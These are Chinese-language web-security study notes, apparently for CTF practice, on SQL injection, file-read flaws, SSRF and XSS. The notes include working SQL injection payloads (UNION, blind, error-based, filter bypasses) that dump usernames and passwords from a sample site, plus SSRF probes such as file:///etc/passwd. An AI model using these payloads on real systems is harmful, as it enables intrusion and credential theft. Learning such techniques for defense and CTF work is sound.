# Web Security

> https://owasp.org/www-project-top-ten/ owasp top 10  十大 Web 应用程序安全风险



# Git Leak

> 详细指令参考见markdown note里面的Git note

git回滚，

# SQL Injection

> https://github.com/Audi-1/sqli-labs 提供不同过滤等级下的注入题目

SQL注入是因为后台**SQL语句拼接了用户的输入**，而且Web应用程序对用户输入数据的合法性没有判断和过滤，**前端传入后端的参数是攻击者可控的**，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作，e.g. 增删改查...，如果数据库的用户权限足够大，还可以对操作系统执行操作。SQL注入是针对数据库、后台、系统层面的攻击

1. 平台层注入：由不安全的数据库配置或数据库平台的漏洞所致
2. 代码层注入：由于程序员对输入未进行细致地过滤

SQL注入功效：

- 有写文件权限下，INTO OUTFILE, DUMPFILE想web目录写文件，或写文件后结合文件包含漏洞达到代码执行效果
- 有读文件权限下，`load_file()`读取网站源码和配置信息、获取敏感数据
- 提升权限，或更更高用户/管理员权限，绕过登录，添加用户，调整用户权限等
- 通过注入控制数据库查询出来的数据，控制模板、缓存等文件的内容来获取权限，删除、读取关键文件
- 在可以执行多语句的情况下，控制整个数据库，控制任意数据、任意字段长度
- SQL Server一类数据库中可以直接执行系统命令



## SQL Basis

mysql: 

- 单行注释：`#`
- 多行注释：`/* */`

在**MySQL5.0以上**，MySQL默认添加 `information_schema` 数据库，MySQL所有数据库名、表名、字段名都可以从中查询到

`information_schema`数据库中三个很重要的表

- `information_schema.schemata`: mysql数据库中所有数据库的库名
- `information_schema.tables`： mysql数据库中所有数据表的表名
- `information_schema.columns`: mysql数据库中所有列的列名

`information_schema` 数据库中的表是只读的，不能进行更新、删除和插入...，不能加载触发器，实际只是一个视图，不是基本表，没有关联的文件

```mysql
select schema_name from information_schema.schemata limit 0,1 # 查第一个数据库名
select table_name from information_schema.tables limit 0,1 # 查第一个数据表名
select table_name from information_schema.tables where table_schema='security'limit 0,1 # 查security库中所有表名
select column_name from information_schema.columns limit 0,1 # 查第一个列名
# 查security库中的数据表users的所有列
select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1
# 查users表中指定列password的第一条数据(只能是database()所在数据库的数据，因当前数据库不能查其他数据库的数据)
select password from users limit 0,1
```

## sql Query

> https://blog.csdn.net/qq_36119192/article/details/82875868  常见SQL语句

```mysql
version()： 查询数据库的版本
user()：查询数据库的使用者
database()：数据库
system_user()：系统用户名
session_user()：连接数据库的用户名
current_user：当前用户名
load_file()：读取本地文件
@@datadir：读取数据库路径
@@basedir：mysql安装路径
@@version_complie_os：查看操作系统

```



## Categories

**依据注入点类型分类**

- 数字类型的注入
- 字符串类型的注入
- 搜索型注入

**依据提交方式分类**

- GET注入
- POST注入
- COOKIE注入
- HTTP头注入(XFF注入、UA注入、REFERER注入）

**依据获取信息的方式分类**

- 基于布尔的盲注
- 基于时间的盲注
- 基于报错的注入
- 联合查询注入
- 堆查询注入 (可同时执行多条语句)



根据获取数据的便利性，使用优先级：

UNION注入 > 报错注入 > 布尔盲注 > 时间盲注

### 数字型注入 UNION注入

- 找到输入的参数点、通过加减乘除等运算判断输入参数附近没有引号包裹，再通过通用的攻击手段获取数据库敏感信息

访问`http://1.1.1.1/sqll.php?id=3-1`出来的结果与`http://1.1.1.1/sqll.php?id=2`一样，可判断注入点为数字型注入。输入点`$_GET['id']`附近没有引号包裹

```mysql
# 查询当前库的所有表名(实际上有长度限制)并显示在一个字段中
table_name # information_schema 库的tables表的表名字段，表中还有数据库名字段table_schema；
database() # 返回当前数据库名称
group_concat() # 用","联合多行记录
http://1.1.1.1/sqll.php?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
# 以上链接访问后网页输出内容为 1  wp_files,wp_news,wp_user
# 通过information_schema.columns表 查询wp_user表中的字段名 # 输出： id,user,pwd
http://1.1.1.1/sqll.php?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='wp_user'
# 至此，获得到了表名wp_user以及wp_user的字段名id,user,pwd # 可以用以下方法进行数字型注入
http://1.1.1.1/sqll.php?id=-1 union select user pwd from wp_user # 用-1 (也可以换成很大的数字) 使得前一个查询无结果
http://1.1.1.1/sqll.php?id=1 union select user pwd from wp_user limit 1, 1 # 显示查询结果的第 1 条记录后的 1 条记录
```



### 字符型注入 布尔盲注 时间盲注

将 数字型注入 UNION注入 里的案例中的`$_GET['id']`修改为`'".$_GET['id']."'`，组合后的查询语句变成了`id='1'`而不是`id=1`。MySQL中等好两边如果类型不一致，会发生强制转换。

```mysql
# 强制转换 a会被强制转换为0
'1'=1 '1a'=1 'a'=0
```

```mysql
http://1.1.1.1/sql2.php?id=3-2 # 页面为空
http://1.1.1.1/sql2.php?id=2a # 页面显示内容与 http://1.1.1.1/sql2.php?id=2 显示的相同
# 根据以上两个可以判断是个字符型注入
http://1.1.1.1/sql2.php?id=2%27%23 # %27:' # %23:# "'"会把前面的"'"闭合   '#'会把后面的"'"注释掉   # %20： space
# 剩余操作与前例相同 # 即在单引号和"#"之间加上注入的语句 # 末尾的#可以换成%27:' 单引号来闭合
http://1.1.1.1/sql2.php?id=2%27union%20select%201,concat(user,0x7e,pwd)%20from%20wp_user%20limit%201,1%23 
```

```mysql
http://1.1.1.1/sql2.php?id=1' and '1 # 经sql语句的单引号闭合后 查询语句变成 ... where id='1' and '1' # 后面的'1'被强制转换为True
# where是select操作的一个判断条件 id=1为查询条件。and代表要满足另一个条件。'a'被强制转换为False 条件不满足 查询结果为空
select title,content from wp_news where id='1' and 'a' 
```

```mysql
'1'=True 'a'=False
```



MySQL自带的函数进行数据截取

```mysql
substring()
mid() 
substr()
```





- bool盲注案例：

```mysql
# AND后是从wp_user里取user和pwd，按 user~pwd拼接起来，然后判断从第1位开始的1位字母是否等于'a'
# select concat(user,0x7e,pwd)from wp_user == admin~this_is_the_admin_password # ctf01: p13 1-2-3
select title,content from wp_news where id='1' AND (select mid((select concat(user,0x7e,pwd)from wp_user),1,1))='a'
# 想要达到上面这个语句，url对应为   # %23=#
http://1.1.1.1/sql2.php?id=1'and(select mid((select concat(user,0x7e,pwd)from wp_user),1,1))='a'%23 
# 同理，判断第二个字母是否为d # 如果为d 那么页面会有回显 ，否则没有回显（因为and后为false 总体为false 就不会回显id='1'的内容）
http://1.1.1.1/sql2.php?id=1'and(select mid((select concat(user,0x7e,pwd)from wp_user),2,1))='d'%23 
```



时间盲注：某些情况下，页面回显内容完全一致。此时可以通过sleep()函数、if条件函数、and、or函数的短路特性和SQL执行的时间判断SQL攻击的结果。本质与bool盲注类似，只是时间盲注观察的是时间，bool盲注观察的是回显。



### 报错注入



```php
VAR_DUMP(mysqli_error($conn)); // 这个会显示错误
```

```mysql
updatexml() # 第二个参数应为合法的XPATH路径，否则会报错，又因为php VAR_DUMP会把报错输出，所以可以把想要查看的信息传入updatexml的2nd para
http://1.1.1.1/sql2.php?id=1'or updatexml(1,concat(0x7e,(select pwd from wp_user)),1)%23
```

当开启多语句执行的时候，可以采用多语句执行的方式修改数据库的任意结构的和数据，称为**堆叠注入**



## Vulnerability Trigger

> SQL注入点 漏洞触发点





## Injection and Defense

可替代空格的空白符：

```
%09 %0a %0b %0c %0d %a0
```

- %a0 在特定字符集才能利用
- `/**/`组合、括号



```php
$id=str_replace("SELECT", "", $sql) # 将SELECT替换成空
```

1. 用SEASELECTLECT绕过，SELECT被替换成空之后，剩下的就是SELECT
2. 大小写绕过，sEleCt不会被匹配到，MySQL关键字大小写不敏感



### 逃逸引号

开发者往往会将用户输入做一次全局addslashes，即转移单引号、反斜杠，如`"'"`变为`"\'"`

编码解码：urldecode、base_64_decode解码函数等，当处于编码状态时，引号无法被转义，解码后如果直接进入SQL语句即可造成注入



二次注入：根本原因是相信从数据库中取出的数据无害。

> ctf01 p32



字符串截断







# Arbitrary File Read Vulnerability

> 任意文件读取漏洞

文件读取漏洞：攻击者读取到开发者不允许读取到的文件

文件读取漏洞在每种可部署web应用的程序语言中几乎都存在，本质上不是语言问题而是开发者对意外情况考虑不足产生的。

轮子代码的漏洞随着多次迭代复用，漏洞也一级级传递，需要对调用链追根溯源。

有些任意文件读取漏洞 开发者无法通过代码控制，常由Web Server自身问题、不安全的服务器配置导致。

Web Server基本机制：从服务器中读取代码、资源文件，把代码类文件传给解释器/CGI程序执行，然后将执行的结果和资源文件反馈给客户端用户。存在于其中的文件操作可能被干预，导致：非预期文件读取；把代码类文件当成资源文件...



## Vulnerability Trigger

> 文件读取漏洞触发点



### Web Language



#### PHP

文件读：

```php
file_get_contents() file() fopen() fread() fgets()
```

文件包含：

```php
include() require() include_once() require_once()
system() exec()
```



### Middleware & Server

> 中间件、服务器相关的文件读取漏洞触发点



# SSRF

> 服务端请求伪造 Server Side Request Forgery

通过构造数据进而伪造服务器端发起请求的漏洞。因为请求时内部发起的，故一般SSRF攻击目标是外网无法访问的内部系统。

形成原因：服务端提供了从外部服务获取数据的功能。但没有对目标地址、协议等参数进行过滤和限制。攻击者可以自由构造参数，发起预期外请求



## URL

> URL URI wiki https://en.wikipedia.org/wiki/Uniform_Resource_Identifier

```assembly
URI = scheme:[//authority]path[?query][#fragment]
[userinfo@]host[:port]      # authority 组成
```

![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/URI_syntax_diagram.svg.png)

- scheme: 大小写不敏感。表示获取资源所需的协议
- authority: 
  - userinfo: 较少用，格式:`user:password@`。
  - host: 表示从哪个服务器上获取资源，以域名 / IP呈现(e.g. baidu.com, 127.0.0.1)
  - port: 服务器端口号。使用默认端口号时可以将端口省略
- path: 指向资源的路径。`/`分层
- query: 查询字符串，将用户输入数据传递给服务端，`?`开头。e.g. `?username=admin&password=admin123`
- fragment: 片段ID。fragment内容不会传递给服务器，一般用于表示页面锚点

```cpp
          userinfo       host      port
          ┌──┴───┐ ┌──────┴──────┐ ┌┴┐
  https://john.doe@www.example.com:123/forum/questions/?tag=networking&order=newest#top
  └─┬─┘   └───────────┬──────────────┘└───────┬───────┘ └───────────┬─────────────┘ └┬┘
  scheme          authority                  path                 query           fragment

  ldap://[2001:db8::7]/c=GB?objectClass?one
  └┬─┘   └─────┬─────┘└─┬─┘ └──────┬──────┘
  scheme   authority   path      query

  mailto:John.Doe@example.com
  └─┬──┘ └────┬─────────────┘
  scheme     path

  news:comp.infosystems.www.servers.unix
  └┬─┘ └─────────────┬─────────────────┘
  scheme            path

  tel:+1-816-555-1212
  └┬┘ └──────┬──────┘
  scheme    path

  telnet://192.0.2.16:80/
  └─┬──┘   └─────┬─────┘│
  scheme     authority  path

  urn:oasis:names:specification:docbook:dtd:xml:4.1.2
  └┬┘ └──────────────────────┬──────────────────────┘
  scheme                    path
```







## SSRF Attack

SSRF一般出现在有调用外部资源的场景中。如图片识别服务，文件处理服务，远程资源请求

测试SSRF漏洞的应用时，可测试是否支持常见协议：

- `file://`: 从文件协同中获取文件内容。e.g. `file:///etc/passwd`
- `dict://`: 字典服务器协议。客户端能够访问更多字典源，可获取服务器运行的服务版本信息等
- `gopher://`: 分布式文档传递服务。通过控制访问的URL可实现向指定服务器发送任意内容，e.g. HTTP请求，MySQL请求



# RCE





# XSS

> Cross Site Scripting 跨站脚本攻击

往Web页面里插入恶意Script代码，当用户浏览该页时，嵌入Web里的Script会被执行，达到恶意攻击用户的目的

xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以在代码审计中xss漏洞关键就是寻找参数未过滤的输出函数





# Web File Upload



# 反序列化





# Web: Python
